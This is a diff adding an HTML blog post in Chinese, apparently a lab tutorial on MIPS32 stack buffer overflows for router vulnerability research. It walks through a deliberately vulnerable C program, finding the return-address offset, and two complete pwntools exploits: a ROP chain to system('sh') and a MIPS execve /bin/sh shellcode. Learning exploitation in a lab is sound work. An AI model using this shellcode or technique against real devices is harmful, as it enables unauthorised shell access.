@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <title>
+        
+          mips缓冲区溢出 - hello word
+        
+    </title>
+
+    <link rel="canonical" href="http://yoursite-url/2019/08/31/mips缓冲区溢出/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS --> 
+    <link rel="stylesheet" href="/css/beantech.min.css">
+    
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <link rel="stylesheet" href="/css/widget.css">
+
+    <link rel="stylesheet" href="/css/rocket.css">
+
+    <link rel="stylesheet" href="/css/signature.css">
+
+    <link rel="stylesheet" href="/css/toc.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            background-image: url('null')
+            /*post*/
+        
+    }
+    
+    #signature{
+        background-image: url('/img/signature/BeanTechSign-white.png');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#mips" title="mips">mips</a>
+                            
+                        </div>
+                        <h1>mips缓冲区溢出</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by 骑猪满天飞 on
+                            2019-08-31
+                        </span>
+                    </div>
+                
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Hello Word</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Modify by Yu-Hsuan Yen -->
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1><span id="mips32-堆栈">MIPS32 堆栈</span></h1>
+<p>与传统PC的x86相比，MIPS32的函数调用存在以下差异：</p>
+<ul>
+<li>MIPS架构中没有EBP（栈底指针）。</li>
+<li>前四个参数分别保存在$a0-$a3寄存器中，剩下的参数从右往左依次入栈</li>
+<li>x86架构中，call命令调用函数时返回地址入栈，而MIPS的调用指令把函数的返回地址存入$ra寄存器。</li>
+</ul>
+<h2><span id="叶子函数与非叶子函数">叶子函数与非叶子函数</span></h2>
+<pre><code>概念：如果一个函数A中不再调用其他任何函数，那么当前的函数A就是一个叶子函数，否则函数A就是一个非叶子函数。
+</code></pre>
+<p>在函数调用过程中，函数调用指令将返回地址复制到$ra寄存器，然后跳转到被调用的函数。</p>
+<ul>
+<li>如果被调用的函数是叶子函数，那么在被调函数返回时直接执行jr $ra返回。</li>
+<li>如果被调函数为非叶子函数，那么被调函数会先将$ra存入栈中，返回时从栈中取出保存的返回地址到$ra再执行jr $ra。</li>
+</ul>
+<p>非叶子函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">subcall.c</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void hello()&#123;</span><br><span class="line">    printf(&quot;hello word&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    hello();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>交叉编译：mips-linux-gcc subcall.c -static -o subcall<br>
+使用IDA 查看subcall：<br>
+<img src="subcall.png" alt="subcall"><br>
+hello函数为非叶子函数，通过<code>sw $ra, 0x20+var_4($sp)</code>指令将$ra中的返回地址保存到栈上，在返回时通过<code>lw $ra, 0x20+var_4($sp)</code>指令将返回地址取回$ra。</p>
+<p>叶子函数则无这个过程。</p>
+<h1><span id="缓冲区溢出">缓冲区溢出</span></h1>
+<p>如果上面的hello函数中的局部变量存在缓冲区溢出，则可通过覆盖栈上保存的$ra的值，进行漏洞利用。</p>
+<p>家用路由器漏洞挖掘中的简单示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">vuln.c</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"> </span><br><span class="line">void do_system(int code,char *cmd)</span><br><span class="line">&#123;</span><br><span class="line">    char buf[255];</span><br><span class="line">    //sleep(1);</span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char buf[256]=&#123;0&#125;;</span><br><span class="line">    char ch;</span><br><span class="line">    int count = 0;</span><br><span class="line">    unsigned int fileLen = 0;</span><br><span class="line">    struct stat fileData;</span><br><span class="line">    FILE *fp;</span><br><span class="line"> </span><br><span class="line">    if(0 == stat(&quot;passwd&quot;,&amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    else</span><br><span class="line">        return 1;</span><br><span class="line"> </span><br><span class="line">    if((fp = fopen(&quot;passwd&quot;,&quot;rb&quot;)) == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Cannot open file passwd!\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    ch=fgetc(fp);</span><br><span class="line">    while(count &lt;= fileLen)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[--count] = &apos;\x00&apos;;</span><br><span class="line"> </span><br><span class="line">    if(!strcmp(buf,&quot;adminpwd&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">        do_system(count,&quot;ls -l&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;you have an invalid password!\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line"> </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>交叉编译：<br>
+mips-linux-gcc vuln.c -static -o vuln<br>
+代码功能很简单，从passwd文件中读取密码，密码为adminpwd时密码正确，执行ls -l命令，在读取密码向buf中赋值时存在缓冲区溢出漏洞。</p>
+<h2><span id="确定溢出点">确定溢出点</span></h2>
+<p>使用py脚本构造一个600字符的字符串写入passwd：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$python pattern.py create 600 &gt; passwd</span><br><span class="line">$cat passwd </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9</span><br></pre></td></tr></table></figure>
+<p>使用IDA进行动态调试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$qemu-mips -g 1234 overflow </span><br><span class="line"></span><br><span class="line">ida连接调试端口1234</span><br></pre></td></tr></table></figure>
+<p>通过观察IDA中ra的值，ra为6E37416E，因为此程序为大端序，所以实际顺序为6E41376E<br>
+<img src="local.png" alt="pattern"></p>
+<p>确定溢出点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$python pattern.py offset 6E41376E</span><br><span class="line">hex pattern decoded as: n7An</span><br><span class="line">412</span><br></pre></td></tr></table></figure>
+<h2><span id="rop利用">ROP利用</span></h2>
+<p>程序存在do_system(int code,char *cmd)函数调用system，cmd为第二个参数，所以使用$a1寄存器传递。<br>
+漏洞利用思路：</p>
+<ul>
+<li>寻找能够控制$a1寄存器的指令，并将’sh’传入。</li>
+<li>控制$a1后跳转到do_system函数，执行system(‘sh’).</li>
+</ul>
+<p>使用IDA的mipsrop插件寻找相关gadget：<br>
+<img src="gadget.png" alt="gadget"></p>
+<p>其中我们可通过缓冲区溢出控制栈内容，所以可使用<code>0x00401F80 | addiu $a1,$sp,0x58+var_40 | jr 0x58+var_4($sp)</code>指令控制$a1寄存器。</p>
+<p>调用do_system的地址为：0x0040066C<br>
+<img src="do_system.png" alt="dosysytem"></p>
+<p>构造完整exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&apos;mips&apos;, os=&apos;linux&apos;, endian=&apos;big&apos;, word_size=32)</span><br><span class="line"></span><br><span class="line">cmd = &apos;sh&apos;</span><br><span class="line">cmd+=&quot;\x00&quot;*(4-len(cmd)%4)</span><br><span class="line"></span><br><span class="line">system_addr=0x0040066C</span><br><span class="line">rop_addr=0x00401F80</span><br><span class="line">payload = &apos;a&apos;*0x19c+p32(rop_addr)</span><br><span class="line">payload +=&apos;b&apos;*0x18+cmd</span><br><span class="line">payload +=&apos;c&apos;*(0x3c-len(cmd))</span><br><span class="line">payload +=p32(system_addr)</span><br><span class="line"></span><br><span class="line">fp=open(&apos;passwd&apos;,&apos;wb&apos;)</span><br><span class="line">fp.write(payload)</span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure>
+<p><img src="res1.png" alt="res1"></p>
+<h2><span id="shellcode-利用">Shellcode 利用</span></h2>
+<p>从exploit-db上找一个mips架构下大端序的shellcode：<a href="https://www.exploit-db.com/shellcodes/18162" target="_blank" rel="noopener">https://www.exploit-db.com/shellcodes/18162</a></p>
+<p>c语言版shellcode：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">char sc[] = &#123; </span><br><span class="line">        &quot;\x28\x06\xff\xff&quot;        /* slti    a2,zero,-1   */</span><br><span class="line">        &quot;\x3c\x0f\x2f\x2f&quot;        /* lui     t7,0x2f2f    */</span><br><span class="line">        &quot;\x35\xef\x62\x69&quot;        /* ori     t7,t7,0x6269 */</span><br><span class="line">        &quot;\xaf\xaf\xff\xf4&quot;        /* sw      t7,-12(sp)   */</span><br><span class="line">        &quot;\x3c\x0e\x6e\x2f&quot;        /* lui     t6,0x6e2f    */</span><br><span class="line">        &quot;\x35\xce\x73\x68&quot;        /* ori     t6,t6,0x7368 */</span><br><span class="line">        &quot;\xaf\xae\xff\xf8&quot;        /* sw      t6,-8(sp)    */</span><br><span class="line">        &quot;\xaf\xa0\xff\xfc&quot;        /* sw      zero,-4(sp)  */</span><br><span class="line">        &quot;\x27\xa4\xff\xf4&quot;        /* addiu   a0,sp,-12    */</span><br><span class="line">        &quot;\x28\x05\xff\xff&quot;        /* slti    a1,zero,-1   */</span><br><span class="line">        &quot;\x24\x02\x0f\xab&quot;        /* li      v0,4011      */</span><br><span class="line">        &quot;\x01\x01\x01\x0c&quot;        /* syscall 0x40404      */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>漏洞利用思路：</p>
+<ul>
+<li>将栈上保存的$ra寄存器值修改为shellcode地址，返回时跳转到shellcode执行</li>
+</ul>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*0x19c+p32(shell_addr)+shellcode</span><br></pre></td></tr></table></figure>
+<p>根据刚才发送的600个字符串，0x76FFEE44地址保存$ra的值，可将shellcode写到它的下一个地址0x76FFEE48。<br>
+<img src="123.png" alt="shell_addr"><br>
+所以shell_addr = 0x76FFEE48</p>
+<p>完整poc：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&apos;mips&apos;, os=&apos;linux&apos;, endian=&apos;big&apos;, word_size=32)</span><br><span class="line"></span><br><span class="line">shellcode=&quot;\x28\x06\xff\xff&quot;       </span><br><span class="line">shellcode+=&quot;\x3c\x0f\x2f\x2f&quot;</span><br><span class="line">shellcode+=&quot;\x35\xef\x62\x69&quot;</span><br><span class="line">shellcode+=&quot;\xaf\xaf\xff\xf4&quot;</span><br><span class="line">shellcode+=&quot;\x3c\x0e\x6e\x2f&quot;</span><br><span class="line">shellcode+=&quot;\x35\xce\x73\x68&quot;</span><br><span class="line">shellcode+=&quot;\xaf\xae\xff\xf8&quot;</span><br><span class="line">shellcode+=&quot;\xaf\xa0\xff\xfc&quot;</span><br><span class="line">shellcode+=&quot;\x27\xa4\xff\xf4&quot;</span><br><span class="line">shellcode+=&quot;\x28\x05\xff\xff&quot;</span><br><span class="line">shellcode+=&quot;\x24\x02\x0f\xab&quot;</span><br><span class="line">shellcode+=&quot;\x01\x01\x01\x0c&quot; </span><br><span class="line"></span><br><span class="line">shell_addr=0x76FFEE48</span><br><span class="line">payload = &apos;a&apos;*0x19c+p32(shell_addr)+shellcode</span><br><span class="line"></span><br><span class="line">fp=open(&apos;passwd&apos;,&apos;wb&apos;)</span><br><span class="line">fp.write(payload)</span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure>
+<p><img src="res2.png" alt="res2"><br>
+这里存在问题，将payload写入passwd后直接执行vuln，程序出错。通过IDA动态调试的方式运行，成功获得了shell。猜测是MIPS CACHE INCOHERENCY的问题，后续将深入研究。</p>
+<h1><span id="参考连接">参考连接</span></h1>
+<p>《揭秘家用路由器0day漏洞挖掘技术》<br>
+<a href="https://0x43434343.com/2018/02/01/EXPLOITING-BUFFER-OVERFLOWS-ON-MIPS-ARCHITECTURES/" target="_blank" rel="noopener">https://0x43434343.com/2018/02/01/EXPLOITING-BUFFER-OVERFLOWS-ON-MIPS-ARCHITECTURES/</a></p>
+
+                
+
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    
+                        <li class="next">
+                            <a href="/2019/08/31/路由器漏洞挖掘环境搭建/" data-toggle="tooltip" data-placement="top" title="路由器漏洞挖掘环境搭建">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                <!-- duoshuo Share start -->
+                
+                <!-- 多说 Share end-->
+
+                <!-- 多说评论框 start -->
+                
+                <!-- 多说评论框 end -->
+
+                <!-- disqus comment start -->
+                
+                    <div class="comment">
+                        <div id="disqus_thread" class="disqus-thread"></div>
+                    </div>
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">MIPS32 堆栈</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">叶子函数与非叶子函数</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">缓冲区溢出</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">确定溢出点</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">ROP利用</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">2.3.</span> <span class="toc-nav-text">Shellcode 利用</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#null"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">参考连接</span></a></li></ol>
+        
+        </div>
+      </aside>
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#mips" title="mips">mips</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="http://beantech.org" target="_blank">Bean Tech</a></li>
+                    
+                        <li><a href="http://blog.kaijun.rocks" target="_blank">Kaijun&#39;s Blog</a></li>
+                    
+                        <li><a href="http://huangxuan.me" target="_blank">Hux Blog</a></li>
+                    
+                        <li><a href="#" target="_blank">It Helps SEO</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- disqus embedded js code start (one page only need to embed once) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "your-disqus-ID";
+    var disqus_identifier = "http://yoursite-url/2019/08/31/mips缓冲区溢出/";
+    var disqus_url = "http://yoursite-url/2019/08/31/mips缓冲区溢出/";
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus embedded js code start end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/zettt8214">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; 骑猪满天飞 2019 
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    re-Ported by <a href="http://beantech.org">BeanTech</a> | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=YenYuHsuan&repo=hexo-theme-beantech&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://yoursite-url/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = 'yoursite';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
